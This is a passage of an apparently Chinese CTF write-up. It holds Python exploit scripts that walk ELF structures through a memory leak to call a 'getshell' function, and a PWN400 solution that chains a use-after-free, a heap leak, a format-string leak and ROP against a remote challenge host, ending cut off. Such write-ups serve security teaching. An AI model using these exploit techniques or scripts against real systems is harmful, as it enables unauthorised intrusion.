class="python value">8</code><code class="python plain">])</code></div><div class="line number64 index63 alt1"><code class="python comments">#&nbsp;find&nbsp;program&nbsp;header&nbsp;table</code></div><div class="line number65 index64 alt2"><code class="python keyword">def</code>&nbsp;<code class="python plain">find_phdr(elf_base):</code></div><div class="line number66 index65 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code>&nbsp;<code class="python plain">BITS&nbsp;</code><code class="python keyword">=</code><code class="python keyword">=</code>&nbsp;<code class="python value">64</code><code class="python plain">:</code></div><div class="line number67 index66 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;get&nbsp;address&nbsp;of&nbsp;program&nbsp;header&nbsp;table</code></div><div class="line number68 index67 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">phdr&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(leak(elf_base&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python value">0x20</code><code class="python plain">,&nbsp;</code><code class="python value">0x8</code><code class="python plain">))&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python plain">elf_base</code></div><div class="line number69 index68 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code>&nbsp;<code class="python string">'[+]&nbsp;program&nbsp;headers&nbsp;table\t\t:\t0x%x'</code>&nbsp;<code class="python keyword">%</code>&nbsp;<code class="python plain">phdr</code></div><div class="line number70 index69 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code>&nbsp;<code class="python plain">phdr</code></div><div class="line number71 index70 alt2"><code class="python comments">#&nbsp;find&nbsp;dynamic&nbsp;section&nbsp;table&nbsp;(.dynamic&nbsp;section&nbsp;-&gt;&nbsp;DYNAMIC&nbsp;segment)</code></div><div class="line number72 index71 alt1"><code class="python keyword">def</code>&nbsp;<code class="python plain">find_dyn_section(phdr,&nbsp;elf_base):</code></div><div class="line number73 index72 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code>&nbsp;<code class="python plain">BITS&nbsp;</code><code class="python keyword">=</code><code class="python keyword">=</code>&nbsp;<code class="python value">64</code><code class="python plain">:</code></div><div class="line number74 index73 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">phdr_ent&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">phdr</code></div><div class="line number75 index74 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">while</code>&nbsp;<code class="python color1">True</code><code class="python plain">:</code></div><div class="line number76 index75 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">garbage&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l32(leak(phdr_ent,&nbsp;</code><code class="python value">0x4</code><code class="python plain">))</code></div><div class="line number77 index76 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;p_type&nbsp;of&nbsp;dynamic&nbsp;segment&nbsp;is&nbsp;0x2</code></div><div class="line number78 index77 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code>&nbsp;<code class="python plain">garbage&nbsp;</code><code class="python keyword">=</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x2</code><code class="python plain">:</code></div><div class="line number79 index78 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">break</code></div><div class="line number80 index79 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">phdr_ent&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x38</code></div><div class="line number81 index80 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">dyn_section&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(leak(phdr_ent&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python value">0x10</code><code class="python plain">,&nbsp;</code><code class="python value">0x8</code><code class="python plain">))&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python plain">elf_base</code></div><div class="line number82 index81 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">print</code>&nbsp;<code class="python string">'[+]&nbsp;.dynamic&nbsp;section&nbsp;headers&nbsp;table\t:\t0x%x'</code>&nbsp;<code class="python keyword">%</code>&nbsp;<code class="python plain">dyn_section</code></div><div class="line number83 index82 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code>&nbsp;<code class="python plain">dyn_section</code></div><div class="line number84 index83 alt1"><code class="python keyword">def</code>&nbsp;<code class="python plain">find_sym_str_table(dyn_section):</code></div><div class="line number85 index84 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code>&nbsp;<code class="python plain">BITS&nbsp;</code><code class="python keyword">=</code><code class="python keyword">=</code>&nbsp;<code class="python value">64</code><code class="python plain">:</code></div><div class="line number86 index85 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">dyn_ent&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">dyn_section</code></div><div class="line number87 index86 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">dt_sym_tab&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x0</code></div><div class="line number88 index87 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">dt_str_tab&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x0</code></div><div class="line number89 index88 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">while</code>&nbsp;<code class="python color1">True</code><code class="python plain">:</code></div><div class="line number90 index89 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">garbage&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(leak(dyn_ent,&nbsp;</code><code class="python value">0x8</code><code class="python plain">))</code></div><div class="line number91 index90 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code>&nbsp;<code class="python plain">garbage&nbsp;</code><code class="python keyword">=</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x6</code><code class="python plain">:</code></div><div class="line number92 index91 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">dt_sym_tab&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(leak(dyn_ent&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python value">0x8</code><code class="python plain">,&nbsp;</code><code class="python value">0x8</code><code class="python plain">))</code></div><div class="line number93 index92 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">elif</code>&nbsp;<code class="python plain">garbage&nbsp;</code><code class="python keyword">=</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x5</code><code class="python plain">:</code></div><div class="line number94 index93 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">dt_str_tab&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(leak(dyn_ent&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python value">0x8</code><code class="python plain">,&nbsp;</code><code class="python value">0x8</code><code class="python plain">))</code></div><div class="line number95 index94 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code>&nbsp;<code class="python plain">dt_str_tab&nbsp;</code><code class="python keyword">and</code>&nbsp;<code class="python plain">dt_sym_tab:</code></div><div class="line number96 index95 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">break</code></div><div class="line number97 index96 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">dyn_ent&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x10</code></div><div class="line number98 index97 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">print</code>&nbsp;<code class="python string">'[+]&nbsp;symtab\t\t\t\t:\t0x%x'</code>&nbsp;<code class="python keyword">%</code>&nbsp;<code class="python plain">dt_sym_tab</code></div><div class="line number99 index98 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code>&nbsp;<code class="python string">'[+]&nbsp;strtab\t\t\t\t:\t0x%x'</code>&nbsp;<code class="python keyword">%</code>&nbsp;<code class="python plain">dt_str_tab</code></div><div class="line number100 index99 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code>&nbsp;<code class="python plain">(dt_sym_tab,&nbsp;dt_str_tab)</code></div><div class="line number101 index100 alt2"><code class="python keyword">def</code>&nbsp;<code class="python plain">find_func_adr(dt_sym_tab,&nbsp;dt_str_tab,&nbsp;func,&nbsp;elf_base):</code></div><div class="line number102 index101 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code>&nbsp;<code class="python plain">BITS&nbsp;</code><code class="python keyword">=</code><code class="python keyword">=</code>&nbsp;<code class="python value">64</code><code class="python plain">:</code></div><div class="line number103 index102 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">sym_ent&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">dt_sym_tab</code></div><div class="line number104 index103 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">while</code>&nbsp;<code class="python color1">True</code><code class="python plain">:</code></div><div class="line number105 index104 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">garbage&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l32(leak(sym_ent,&nbsp;</code><code class="python value">0x4</code><code class="python plain">))</code></div><div class="line number106 index105 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">name&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">leak(dt_str_tab&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python plain">garbage,&nbsp;</code><code class="python functions">len</code><code class="python plain">(func))</code></div><div class="line number107 index106 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code>&nbsp;<code class="python plain">name&nbsp;</code><code class="python keyword">=</code><code class="python keyword">=</code>&nbsp;<code class="python plain">func:</code></div><div class="line number108 index107 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">break</code></div><div class="line number109 index108 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">sym_ent&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x18</code></div><div class="line number110 index109 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">adr_func&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(leak(sym_ent&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python value">0x8</code><code class="python plain">,&nbsp;</code><code class="python value">0x8</code><code class="python plain">))&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python plain">elf_base</code></div><div class="line number111 index110 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code>&nbsp;<code class="python string">'[+]&nbsp;%s&nbsp;loaded&nbsp;address\t:\t0x%x'</code>&nbsp;<code class="python keyword">%</code>&nbsp;<code class="python plain">(func,&nbsp;adr_func)</code></div><div class="line number112 index111 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code>&nbsp;<code class="python plain">adr_func</code></div><div class="line number113 index112 alt2"><code class="python comments">#&nbsp;exploit&nbsp;ELF</code></div><div class="line number114 index113 alt1"><code class="python keyword">def</code>&nbsp;<code class="python plain">lookup(func):</code></div><div class="line number115 index114 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">elf_base&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">find_elf_base()</code></div><div class="line number116 index115 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">phdr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">find_phdr(elf_base)</code></div><div class="line number117 index116 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">dyn_section&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">find_dyn_section(phdr,&nbsp;elf_base)</code></div><div class="line number118 index117 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">dt_sym_tab,&nbsp;dt_str_tab&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">find_sym_str_table(dyn_section)</code></div><div class="line number119 index118 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">func_address&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">find_func_adr(dt_sym_tab,&nbsp;dt_str_tab,&nbsp;func,&nbsp;elf_base)</code></div><div class="line number120 index119 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code>&nbsp;<code class="python plain">func_address</code></div><div class="line number121 index120 alt2"><code class="python plain">result&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">lookup(</code><code class="python string">'getshell'</code><code class="python plain">)</code></div><div class="line number122 index121 alt1"><code class="python functions">print</code>&nbsp;<code class="python string">'[+]&nbsp;function&nbsp;@&nbsp;0x%x'</code>&nbsp;<code class="python keyword">%</code>&nbsp;<code class="python plain">result</code></div><div class="line number123 index122 alt2"><code class="python plain">getshell(result)</code></div><div class="line number124 index123 alt1"><code class="python plain">io.itr()</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">Reference</span></strong><br></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">1. <a href="http://uaf.io/exploitation/misc/2016/04/02/Finding-Functions.html" _src="http://uaf.io/exploitation/misc/2016/04/02/Finding-Functions.html">http://uaf.io/exploitation/misc/2016/04/02/Finding-Functions.html</a></span></p><p style="text-indent: 2em; text-align: left;"><br></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br></span></strong></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">PWN400</span></strong></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Bugs</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">1. 在delete时没有对对象指针置零</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">2. 加密后输入加密结果时存在泄漏，可泄漏出堆地址</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Thinking</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">由于在delete后没有对对象指针置零，可导致一个uaf，通过uaf伪造一个对象的虚表指针和虚表，从而执行任意地址代码。另外，由于对象在调用虚函数时会传入一个参数，这个参数是对象本身的地址，因此第一个参数不能直接被我们控制，需要通过一段ROP来设置调用时的参数</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">大致的利用方式就是先通过UAF调用printf来泄露libc基地址，然后再通过system来getshell</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">通过一个</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Exploit</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  python"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div><div class="line number40 index39 alt1">40</div><div class="line number41 index40 alt2">41</div><div class="line number42 index41 alt1">42</div><div class="line number43 index42 alt2">43</div><div class="line number44 index43 alt1">44</div><div class="line number45 index44 alt2">45</div><div class="line number46 index45 alt1">46</div><div class="line number47 index46 alt2">47</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python keyword">from</code>&nbsp;<code class="python plain">zio&nbsp;</code><code class="python keyword">import</code>&nbsp;<code class="python keyword">*</code></div><div class="line number2 index1 alt1"><code class="python plain">target&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">(</code><code class="python string">'119.28.62.216'</code><code class="python plain">,&nbsp;</code><code class="python value">10023</code><code class="python plain">)</code></div><div class="line number3 index2 alt2"><code class="python plain">io&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">zio((target),&nbsp;print_read&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">COLORED(</code><code class="python functions">REPR</code><code class="python plain">,&nbsp;</code><code class="python string">'red'</code><code class="python plain">),&nbsp;print_write&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">COLORED(</code><code class="python functions">REPR</code><code class="python plain">,&nbsp;</code><code class="python string">'blue'</code><code class="python plain">),&nbsp;timeout&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">10000</code><code class="python plain">)</code></div><div class="line number4 index3 alt1"><code class="python plain">io.hint([</code><code class="python value">0x401fba</code><code class="python plain">,&nbsp;</code><code class="python value">0x401fe3</code><code class="python plain">,&nbsp;</code><code class="python value">0x400d40</code><code class="python plain">])</code></div><div class="line number5 index4 alt2"><code class="python comments">#&nbsp;adr</code></div><div class="line number6 index5 alt1"><code class="python plain">plt_printf&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x0000000000400be0</code></div><div class="line number7 index6 alt2"><code class="python plain">p8_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x00402336</code></div><div class="line number8 index7 alt1"><code class="python plain">pop_rdi_ret&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x00402343</code></div><div class="line number9 index8 alt2"><code class="python plain">entry&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x400d40</code></div><div class="line number10 index9 alt1"><code class="python comments">#&nbsp;new&nbsp;key</code></div><div class="line number11 index10 alt2"><code class="python keyword">def</code>&nbsp;<code class="python plain">leak():</code></div><div class="line number12 index11 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">io.wls([</code><code class="python value">1</code><code class="python plain">,&nbsp;</code><code class="python value">1</code><code class="python plain">,&nbsp;</code><code class="python value">11</code><code class="python plain">,&nbsp;</code><code class="python value">13</code><code class="python plain">])</code></div><div class="line number13 index12 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;io.wls([2,&nbsp;0x40,&nbsp;(('AAAAAAAA'&nbsp;+'%{}$lx\x00'.format(0x8b)).ljust(0x18,&nbsp;'a')&nbsp;+&nbsp;l64(p8_ret)).ljust(0x40,&nbsp;'a')])</code></div><div class="line number14 index13 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">io.wls([</code><code class="python value">2</code><code class="python plain">,&nbsp;</code><code class="python value">0x40</code><code class="python plain">,&nbsp;((</code><code class="python string">'AAAAAAAA'</code>&nbsp;<code class="python keyword">+</code><code class="python string">'0x%{}$lx\x00'</code><code class="python plain">.</code><code class="python functions">format</code><code class="python plain">(</code><code class="python value">71</code><code class="python plain">)).ljust(</code><code class="python value">0x18</code><code class="python plain">,&nbsp;</code><code class="python string">'a'</code><code class="python plain">)&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python plain">l64(p8_ret)).ljust(</code><code class="python value">0x40</code><code class="python plain">,&nbsp;</code><code class="python string">'a'</code><code class="python plain">)])</code></div><div class="line number15 index14 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">io.rtl(</code><code class="python string">'ciphertext:&nbsp;'</code><code class="python plain">)</code></div><div class="line number16 index15 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">io.r(</code><code class="python value">0x40</code>&nbsp;<code class="python keyword">*</code>&nbsp;<code class="python value">8</code><code class="python plain">)</code></div><div class="line number17 index16 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">heap_base&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(io.rl()[:</code><code class="python keyword">-</code><code class="python value">1</code><code class="python plain">].ljust(</code><code class="python value">0x8</code><code class="python plain">,&nbsp;</code><code class="python string">'\x00'</code><code class="python plain">))&nbsp;</code><code class="python keyword">-</code>&nbsp;<code class="python value">0x270</code></div><div class="line number18 index17 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">print</code>&nbsp;<code class="python string">'[+]&nbsp;heap&nbsp;base:&nbsp;0x%x'</code>&nbsp;<code class="python keyword">%</code>&nbsp;<code class="python plain">heap_base</code></div><div class="line number19 index18 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;free</code></div><div class="line number20 index19 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">io.wls([</code><code class="python value">3</code><code class="python plain">,&nbsp;</code><code class="python value">0x10</code><code class="python plain">,&nbsp;</code><code class="python string">'41'</code>&nbsp;<code class="python keyword">*</code>&nbsp;<code class="python value">0x10</code><code class="python plain">])</code></div><div class="line number21 index20 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;malloc</code></div><div class="line number22 index21 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">io.wls([</code><code class="python value">4</code><code class="python plain">,&nbsp;l64(heap_base&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python value">0x20</code><code class="python plain">)])</code></div><div class="line number23 index22 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;rop&nbsp;chain&nbsp;in&nbsp;stack&nbsp;(uaf)</code></div><div class="line number24 index23 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">io.wls([</code><code class="python value">2</code><code class="python plain">,&nbsp;</code><code class="python value">0x20</code><code class="python plain">,&nbsp;(l64(pop_rdi_ret)&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python plain">l64(heap_base&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python value">0x20</code><code class="python plain">)&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python plain">l64(plt_printf)&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python plain">l64(entry)).ljust(</code><code class="python value">0x20</code><code class="python plain">,&nbsp;</code><code class="python string">'A'</code><code class="python plain">)])</code></div><div class="line number25 index24 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">for</code>&nbsp;<code class="python plain">i&nbsp;</code><code class="python keyword">in</code>&nbsp;<code class="python functions">xrange</code><code class="python plain">(</code><code class="python value">4</code><code class="python plain">):&nbsp;io.rtl(</code><code class="python string">'0x'</code><code class="python plain">)</code></div><div class="line number26 index25 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python 